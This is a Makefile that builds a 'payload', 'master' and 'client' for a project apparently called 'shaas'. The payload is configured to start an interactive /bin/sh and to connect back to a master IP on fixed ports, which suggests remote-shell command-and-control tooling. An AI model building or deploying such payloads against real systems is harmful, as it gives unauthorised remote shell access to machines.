TARGET_CC 		?= gcc
TARGET_STRIP	?= strip
TARGET_ARCH		?= x86_64
TARGET_SHELL	?= /bin/sh
TARGET_ARGV		?= "-i"
TARGET_ENVP		?= "TERM=linux"
TARGET_ARTIFACT	?= shaas.$(TARGET_ARCH).payload
TARGET_OPTLEVEL ?= z
TARGET_CCFLAGS  ?=

MASTER_CC			?= gcc
MASTER_ARCH			?= x86_64
MASTER_IP			?= 127.0.0.1
MASTER_TARGET_PORT	?= 1337
MASTER_REQUEST_PORT	?= 6969
MASTER_ARTIFACT		?= shaas.$(MASTER_ARCH).master
MASTER_PROXY		?= 0

CLIENT_CC		?= gcc
CLIENT_ARCH		?= x86_64
CLIENT_PORT		?= 4200
CLIENT_ARTIFACT	?= shaas.$(CLIENT_ARCH).client

defines =											\
	-DTARGET_ARCH_$(TARGET_ARCH)					\
	-DTARGET_SHELL='"$(TARGET_SHELL)"'				\
	-DTARGET_ARGV='$(TARGET_ARGV)'					\
	-DTARGET_ENVP='$(TARGET_ENVP)'					\
	-DMASTER_IP='"$(MASTER_IP)"'					\
	-DMASTER_TARGET_PORT=$(MASTER_TARGET_PORT)		\
	-DMASTER_REQUEST_PORT=$(MASTER_REQUEST_PORT)	\
	-DCLIENT_PORT=$(CLIENT_PORT)

ifneq ($(MASTER_PROXY),0)
defines += -DMASTER_PROXY
endif

ccflags = 		\
	-Wall 		\
	-I./include	\
	$(defines)
ldflags = 		\
	-lpthread

.PHONY: all clean client master payload

all: client master payload

clean:
	rm -f $(MASTER_ARTIFACT) $(CLIENT_ARTIFACT) $(TARGET_ARTIFACT)

client: $(CLIENT_ARTIFACT)

master: $(MASTER_ARTIFACT)

payload: $(TARGET_ARTIFACT)

$(MASTER_ARTIFACT): master.c
	$(MASTER_CC) $(ccflags) -o $@ $^ $(ldflags)

$(CLIENT_ARTIFACT): client.c
	$(CLIENT_CC) $(ccflags) -o $@ $^

include ./payload/payload.mk
